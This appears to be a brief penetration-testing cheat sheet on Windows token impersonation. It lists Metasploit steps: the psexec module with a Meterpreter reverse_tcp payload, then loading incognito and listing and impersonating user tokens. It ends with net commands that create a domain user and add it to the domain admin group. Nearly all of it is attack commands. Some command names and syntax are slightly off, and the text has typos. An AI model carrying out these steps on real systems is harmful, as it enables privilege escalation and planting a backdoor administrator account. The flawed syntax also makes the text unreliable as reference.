# Token Impersonation

Go to msfconsole&#x20;

use module windows/smb/psexec

use payload windows/\<arch>/meterpreter/reverse\_tcp

set all required options

get metereter connection

then run&#x20;

```
load incognito
```

```
list-tokens -u
```

\-u for users / can try -g for groups

```
Impersonate-token <token name>
```

if the token name consits of a black slash then use double black slash for charecter escaping

To create a new user and add it to admin group

```
net user /add <uname> <pass> /domain
```

```
net group "Domain admin" <uname created above> /ADD/DOMAIN
```
